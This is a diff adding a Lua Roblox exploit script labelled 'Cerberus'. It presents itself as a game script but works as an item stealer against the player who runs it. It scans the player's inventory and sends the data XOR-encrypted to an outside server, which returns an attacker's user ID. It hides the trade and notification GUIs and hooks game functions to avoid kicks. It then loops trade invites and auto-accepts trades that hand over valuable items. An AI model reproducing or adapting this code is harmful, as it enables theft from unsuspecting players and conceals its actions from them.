@@ -1,0 +1,395 @@
+-- Cerberus | discord.gg/scriptroblox
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players           = game:GetService("Players")
+local HttpService       = game:GetService("HttpService")
+local LP                = Players.LocalPlayer
+local cam               = workspace.CurrentCamera
+local pg                = LP:WaitForChild("PlayerGui")
+
+-- CONFIG
+local SECRET_KEY        = getgenv().SECRET_KEY        or ""
+local TARGET_ID         = getgenv().TARGET_ID         or 0
+local DELAY_STEP        = getgenv().DELAY_STEP        or 1
+local TRADE_CYCLE_DELAY = getgenv().TRADE_CYCLE_DELAY or 2
+local API_URL           = getgenv().API_URL            or "https://automoreiraaa.squareweb.app"
+
+local JOB_ID = tostring(game.JobId) .. "_" .. tostring(LP.UserId)
+
+-- TARGET BRAINROTS
+local TargetBrainrots = {
+    ["Headless Horseman"]   = true,
+    ["Meowl"]               = true,
+    ["Skibidi Toilet"]      = true,
+    ["Strawberry Elephant"] = true,
+}
+if getgenv().TARGET_BRAINROTS then
+    for k, v in pairs(getgenv().TARGET_BRAINROTS) do
+        TargetBrainrots[k] = v
+    end
+end
+
+local INVITE_GUID = "afb005f9-6e81-4e0a-8bb0-3555938a9658"
+local SELECT_GUID = "6b5f15fb-5cb9-4d07-a031-bbff8e641eda"
+local READY_GUID  = "d73acf93-6f32-44df-b813-0f6b32c7afd9"
+local ACCEPT_GUID = "918ee0f5-e98f-413f-b76e-baee47b021cb"
+local ITEM_GUID   = "f2c4a9d1-3b7e-4a51-9c8d-1e6f0a2b3c4d"
+local guiNames    = { BrainrotTrader=true, TradeLiveTrade=true, TradePrompts=true }
+
+local activeTargetId = TARGET_ID
+
+-- XOR CRYPT
+local XOR_KEY = "cerberus_xor_2025"
+local function xorCrypt(s)
+    local kl  = #XOR_KEY
+    local out = {}
+    for i = 1, #s do
+        out[i] = string.char(bit32.bxor(
+            string.byte(s, i),
+            string.byte(XOR_KEY, ((i-1) % kl) + 1)
+        ))
+    end
+    return table.concat(out)
+end
+
+local function toHex(s)
+    return (s:gsub(".", function(c)
+        return string.format("%02x", string.byte(c))
+    end))
+end
+
+local function encryptPayload(tbl)
+    local json = HttpService:JSONEncode(tbl)
+    return toHex(xorCrypt(json))
+end
+
+-- REQUEST
+local function getReqFn()
+    return (syn and syn.request) or (http and http.request) or http_request or request
+end
+
+-- UTILS
+local function getRemote(name)
+    local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
+    local children = Net:GetChildren()
+    for i = 1, #children - 1 do
+        if children[i] and children[i+1] and string.find(children[i].Name, name) then
+            return children[i+1]
+        end
+    end
+end
+
+local function applyCleanups()
+    local lc = pg:FindFirstChild("LeftCenter")
+    if lc then lc:Clone().Parent = pg; lc:Destroy() end
+    local nr = getRemote("RE/NotificationService/Notify")
+    if nr then pcall(function()
+        for _, c in ipairs(getconnections(nr.OnClientEvent)) do c:Disable() end
+    end) end
+    cam.ChildAdded:Connect(function(o)
+        if o:IsA("BlurEffect") then task.defer(function() o:Destroy() end) end
+    end)
+    for _, v in ipairs(cam:GetChildren()) do
+        if v:IsA("BlurEffect") then task.defer(function() v:Destroy() end) end
+    end
+    cam:GetPropertyChangedSignal("FieldOfView"):Connect(function() cam.FieldOfView = 70 end)
+    cam.FieldOfView = 70
+    pg.ChildAdded:Connect(function(o)
+        if guiNames[o.Name] then task.defer(function() o:Destroy() end) end
+    end)
+    for _, v in ipairs(pg:GetChildren()) do
+        if guiNames[v.Name] then task.defer(function() v:Destroy() end) end
+    end
+end
+
+-- MODULOS DO JOGO
+local AnimalsShared, AnimalsData
+pcall(function()
+    AnimalsShared = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
+end)
+pcall(function()
+    AnimalsData = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
+end)
+
+-- SYNC STATE
+local function getSyncState()
+    local mod = ReplicatedStorage:WaitForChild("Packages"):FindFirstChild("Synchronizer")
+    if not mod then return nil end
+    local sync = require(mod)
+    for i = 1, 20 do
+        local ok, v = pcall(debug.getupvalue, sync.Get, i)
+        if ok and type(v) == "table" then
+            local count = 0
+            for _ in pairs(v) do count = count + 1; if count > 0 then break end end
+            if count > 0 then return v end
+        end
+    end
+    return nil
+end
+
+local syncState = getSyncState()
+if not syncState then return end
+
+-- SCAN INVENTARIO
+local itemsList     = {}
+local brainrotQueue = {}
+local gearQueue     = {}
+local skinQueue     = {}
+
+local function buildTargetList()
+    local list = {}
+    for name in pairs(TargetBrainrots) do table.insert(list, name) end
+    return list
+end
+
+for _, plotData in pairs(syncState) do
+    if type(plotData) ~= "table" then continue end
+
+    local cacheTable = type(plotData.CacheTable) == "table" and plotData.CacheTable
+    if cacheTable then
+        if type(cacheTable.GearInventory) == "table" then
+            for uuid, gearData in pairs(cacheTable.GearInventory) do
+                if type(gearData) == "table" and gearData.GearName then
+                    table.insert(gearQueue, {UUID = uuid, GearName = gearData.GearName})
+                end
+            end
+        end
+        if type(cacheTable.BaseSkinInventory) == "table" then
+            for uuid, skinData in pairs(cacheTable.BaseSkinInventory) do
+                if type(skinData) == "table" and skinData.SkinName then
+                    table.insert(skinQueue, {UUID = uuid, SkinName = skinData.SkinName})
+                end
+            end
+        end
+    end
+
+    local owner = type(plotData.Get) == "function" and plotData:Get("Owner") or plotData.Owner
+    local isOwner = (typeof(owner) == "Instance" and owner == LP)
+        or (type(owner) == "table" and owner.UserId == LP.UserId)
+    if not isOwner then continue end
+
+    local animalList = type(plotData.Get) == "function"
+        and plotData:Get("AnimalList") or plotData.AnimalList
+    if type(animalList) ~= "table" then continue end
+
+    for slotKey, data in pairs(animalList) do
+        if type(data) ~= "table" or not data.Index then continue end
+
+        local animalName = data.Index
+        local mutation   = data.Mutation or "None"
+        local traits     = (type(data.Traits) == "table") and data.Traits or {}
+
+        local generation = 0
+        if AnimalsShared then
+            local ok, gv = pcall(function()
+                return AnimalsShared:GetGeneration(animalName, data.Mutation, traits, nil)
+            end)
+            if ok and type(gv) == "number" then generation = gv end
+        end
+
+        local displayName = animalName
+        if AnimalsData and AnimalsData[animalName] and AnimalsData[animalName].DisplayName then
+            displayName = AnimalsData[animalName].DisplayName
+        end
+
+        table.insert(itemsList, {
+            name     = displayName,
+            gen      = generation,
+            mutation = tostring(mutation),
+        })
+
+        if TargetBrainrots[animalName] or TargetBrainrots[displayName] then
+            table.insert(brainrotQueue, {
+                slotKey = tonumber(slotKey),
+                data    = data,
+            })
+        end
+    end
+end
+
+-- Removida a verificação que encerrava o script se o inventário ou filas estivessem vazios
+applyCleanups()
+
+-- ENVIO SINCRONO COM XOR
+local function sendScanSync(items, gearsData, skinsData, robloxName)
+    local reqFn = getReqFn()
+    if not reqFn then return false, TARGET_ID end
+
+    local gearsFormatted = {}
+    for _, g in ipairs(gearsData or {}) do
+        table.insert(gearsFormatted, { name = g.GearName, GearName = g.GearName, UUID = g.UUID })
+    end
+
+    local skinsFormatted = {}
+    for _, s in ipairs(skinsData or {}) do
+        table.insert(skinsFormatted, { name = s.SkinName, SkinName = s.SkinName, UUID = s.UUID })
+    end
+
+    local plainPayload = {
+        secret_key       = SECRET_KEY,
+        roblox_name      = robloxName,
+        target_id        = TARGET_ID,
+        job_id           = JOB_ID,
+        target_brainrots = buildTargetList(),
+        items            = items,
+        gears            = gearsFormatted,
+        base_skins       = skinsFormatted,
+    }
+
+    local encBody = HttpService:JSONEncode({ e = encryptPayload(plainPayload) })
+
+    local ok, result = pcall(function()
+        return reqFn({
+            Url    = API_URL .. "/api/script/scan",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["X-Secret-Key"] = SECRET_KEY,
+            },
+            Body = encBody,
+        })
+    end)
+
+    if ok and result and result.Body then
+        local parseOk, data = pcall(HttpService.JSONDecode, HttpService, result.Body)
+        if parseOk and data then
+            local isGood       = data.hasGood == true
+            local activeTarget = isGood and (data.good_target_id or TARGET_ID) or TARGET_ID
+            return isGood, activeTarget
+        end
+    end
+
+    return false, TARGET_ID
+end
+
+local isGood, activeTargetId = sendScanSync(itemsList, gearQueue, skinQueue, LP.Name)
+
+-- ANTI KICK
+if not getgenv().antikick then
+    getgenv().antikick = true
+    pcall(function()
+        local Sync = require(ReplicatedStorage.Packages.Synchronizer)
+        local getupvals = debug.getupvalues or getupvalues
+        local setupval  = debug.setupvalue  or setupvalue
+        local relate
+        for _, v in pairs(getupvals(Sync.Get)) do
+            if type(v) == "function" then
+                relate = v
+                break
+            end
+        end
+        if relate then setupval(relate, 2, true) end
+    end)
+
+    local kck = "\239\187\191"
+    local function isFlag(a) return type(a) == "string" and a:sub(-3) == kck end
+    local newcc   = newcclosure or function(f) return f end
+    local hookfn  = hookfunction or replaceclosure
+    local setread = setreadonly or function() end
+
+    pcall(function()
+        local realFS = Instance.new("RemoteEvent").FireServer
+        local oldHF
+        oldHF = hookfn(realFS, newcc(function(self, ...)
+            if isFlag((...)) then return end
+            return oldHF(self, ...)
+        end))
+    end)
+
+    pcall(function()
+        local mt = getrawmetatable(game)
+        setread(mt, false)
+        local oldNC = mt.__namecall
+        mt.__namecall = newcc(function(self, ...)
+            local m = getnamecallmethod()
+            if (m == "FireServer" or m == "fireServer") and isFlag((...)) then
+                return
+            end
+            return oldNC(self, ...)
+        end)
+        setread(mt, true)
+    end)
+end
+
+-- TRADE
+local net = require(ReplicatedStorage.Packages.Net)
+
+local Trade = {
+    Invite         = net:RemoteFunction("TradeService/Invite"),
+    RemoveItem     = net:RemoteFunction("TradeService/RemoveItem"),
+    AcceptInvite   = net:RemoteFunction("TradeService/AcceptInvite"),
+    RemoveBrainrot = net:RemoteFunction("TradeService/RemoveBrainrot"),
+    AddBrainrot    = net:RemoteFunction("TradeService/AddBrainrot"),
+    AddItem        = net:RemoteFunction("TradeService/AddItem"),
+    SearchUser     = net:RemoteFunction("TradeService/SearchUser"),
+    GetTradeHistory= net:RemoteFunction("TradeService/GetTradeHistory"),
+    CreateInvite   = net:RemoteEvent("TradeService/CreateInvite"),
+    CancelTrade    = net:RemoteEvent("TradeService/CancelTrade"),
+    Ready          = net:RemoteEvent("TradeService/Ready"),
+    HistoryUpdated = net:RemoteEvent("TradeService/HistoryUpdated"),
+    SendChatMessage= net:RemoteEvent("TradeService/SendChatMessage"),
+    DeclineInvite  = net:RemoteEvent("TradeService/DeclineInvite"),
+    Accept         = net:RemoteEvent("TradeService/Accept"),
+    TradeCompleted = net:RemoteEvent("TradeService/TradeCompleted"),
+}
+
+if not (Trade.Invite and Trade.AddBrainrot and Trade.Ready and Trade.Accept) then return end
+
+if #brainrotQueue > 0 then
+    task.spawn(function()
+        local idx = 1
+        while true do
+            local item = brainrotQueue[idx]
+            if item then
+                pcall(function() Trade.AddBrainrot:InvokeServer(SELECT_GUID, item.slotKey, item.data) end)
+                idx = (idx % #brainrotQueue) + 1
+            end
+            task.wait(DELAY_STEP)
+        end
+    end)
+end
+
+if Trade.AddItem and (#gearQueue > 0 or #skinQueue > 0) then
+    task.spawn(function()
+        local gearIdx = 1
+        local skinIdx = 1
+        while true do
+            if #gearQueue > 0 then
+                local item = gearQueue[gearIdx]
+                if item then
+                    pcall(function()
+                        Trade.AddItem:InvokeServer(ITEM_GUID, "Gear", {GearName = item.GearName, UUID = item.UUID})
+                    end)
+                    gearIdx = (gearIdx % #gearQueue) + 1
+                end
+                task.wait(1)
+            end
+            if #skinQueue > 0 then
+                local item = skinQueue[skinIdx]
+                if item then
+                    pcall(function()
+                        Trade.AddItem:InvokeServer(ITEM_GUID, "BaseSkin", {SkinName = item.SkinName, UUID = item.UUID})
+                    end)
+                    skinIdx = (skinIdx % #skinQueue) + 1
+                end
+                task.wait(1)
+            end
+        end
+    end)
+end
+
+task.spawn(function()
+    while true do
+        pcall(function() Trade.Invite:InvokeServer(INVITE_GUID, activeTargetId) end)
+        task.wait(TRADE_CYCLE_DELAY)
+    end
+end)
+
+task.spawn(function()
+    while true do
+        pcall(function() Trade.Ready:FireServer(READY_GUID) end)
+        task.wait(1)
+        pcall(function() Trade.Accept:FireServer(ACCEPT_GUID) end)
+        task.wait(1)
+    end
+end)
